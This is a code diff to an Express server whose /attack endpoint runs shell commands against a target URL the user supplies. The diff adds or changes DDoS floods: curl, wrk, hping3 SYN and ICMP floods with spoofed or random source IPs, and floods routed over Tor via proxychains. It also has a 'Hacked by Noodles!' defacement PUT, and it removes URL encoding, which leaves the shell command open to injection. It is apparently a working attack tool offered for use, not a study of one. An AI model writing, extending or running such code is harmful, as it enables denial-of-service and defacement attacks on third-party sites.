@@ -6,12 +6,14 @@ const path = require('path');
 const os = require('os');
 const publicIp = require('public-ip');
 const rateLimit = require('express-rate-limit');
+const crypto = require('crypto');
 
 app.use(express.static('public'));
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
 const logFilePath = path.join(__dirname, 'logs.txt');
+const apiKey = crypto.randomBytes(32).toString('hex');
 
 const log = (message) => {
     const timestamp = new Date().toISOString();
@@ -24,7 +26,7 @@ const log = (message) => {
 
 const apiLimiter = rateLimit({
 	windowMs: 15 * 60 * 1000,
-	max: 10,
+	max: 1000,
 	message: 'Too many requests, try again after 15 minutes',
 	standardHeaders: true,
 	legacyHeaders: false,
@@ -37,6 +39,12 @@ app.post('/attack', async (req, res) => {
     const attackType = req.body.attackType;
     const duration = parseInt(req.body.duration) || 60;
     const intensity = parseInt(req.body.intensity) || 100;
+    const userApiKey = req.headers['x-api-key'];
+
+    if (userApiKey !== apiKey) {
+        log('Error: Unauthorized API key.');
+        return res.status(401).send('Unauthorized.');
+    }
 
     if (!target) {
         log('Error: Target URL is required.');
@@ -44,26 +52,25 @@ app.post('/attack', async (req, res) => {
     }
 
     let command = '';
-    const numThreads = os.cpus().length * 4;
-    const encodedTarget = encodeURIComponent(target);
+    const numThreads = os.cpus().length * 8;
+    const encodedTarget = target;
 
     switch (attackType) {
         case 'ddos':
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -c ${intensity * 100} -d 120 -S -u -p 80 --flood ${encodedTarget} & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -A 'Noodles-DDoS' -s -o /dev/null ${encodedTarget} & done; done"`;
             break;
         case 'deface':
             const defaceScript = `<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">`;
-            const encodedDefaceScript = Buffer.from(defaceScript).toString('base64');
-            command = `timeout ${duration} bash -c "while true; do curl -X PUT -H 'Content-Type: text/html' -d $'${defaceScript}' ${encodedTarget}/index.html & done"`;
+            command = `timeout ${duration} bash -c "curl -X PUT -H 'Content-Type: text/html' -d $'${defaceScript}' ${encodedTarget}/index.html"`;
             break;
         case 'connect':
-            command = `timeout ${duration} bash -c "for i in $(seq 1000); do while true; do nc -v ${encodedTarget} 80 & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do nc -v ${encodedTarget} 80 & done; done"`;
             break;
         case 'tor_ddos':
            try {
                 const externalIp = await publicIp.v4();
                 log(`Attacker IP: ${externalIp}`);
-                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do proxychains4 hping3 -c ${intensity * 100} -d 120 -S -u -p 80 --flood ${encodedTarget} & done; done"`;
+                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do proxychains4 curl -A 'Noodles-Tor-DDoS' -s -o /dev/null ${encodedTarget} & done; done"`;
             } catch (error) {
                 log(`Error getting public IP: ${error.message}`);
                 return res.status(500).send(`Error getting public IP: ${error.message}`);
@@ -92,6 +99,23 @@ app.post('/attack', async (req, res) => {
              command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -s 65500 ${encodedTarget} & done; done"`;
              break;
 
+        case 'http_flood':
+            command = `timeout ${duration} bash -c "while true; do wrk -t${numThreads} -c${intensity * 10} -d${duration} ${encodedTarget}; done"`;
+            break;
+
+        case 'tcp_flood':
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p 80 --flood --rand-source ${encodedTarget} & done; done"`;
+            break;
+
+        case 'spoofed_flood':
+             const spoofedIp = generateRandomIP();
+             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p 80 -a ${spoofedIp} --flood ${encodedTarget} & done; done"`;
+             break;
+
+        case 'icmp_flood':
+             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --flood --rand-source ${encodedTarget} & done; done"`;
+             break;
+
         default:
             log(`Error: Invalid attack type: ${attackType}`);
             return res.status(400).send('Invalid attack type.');
@@ -113,6 +137,10 @@ app.post('/attack', async (req, res) => {
     });
 });
 
+function generateRandomIP() {
+    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+}
+
 app.get('/logs', (req, res) => {
     fs.readFile(logFilePath, 'utf8', (err, data) => {
         if (err) {
@@ -121,6 +149,10 @@ app.get('/logs', (req, res) => {
         }
         res.send(data.split('\n').reverse().join('\n'));
     });
+});
+
+app.get('/api-key', (req, res) => {
+    res.send({ apiKey: apiKey });
 });
 
 const PORT = process.env.PORT || 3000;
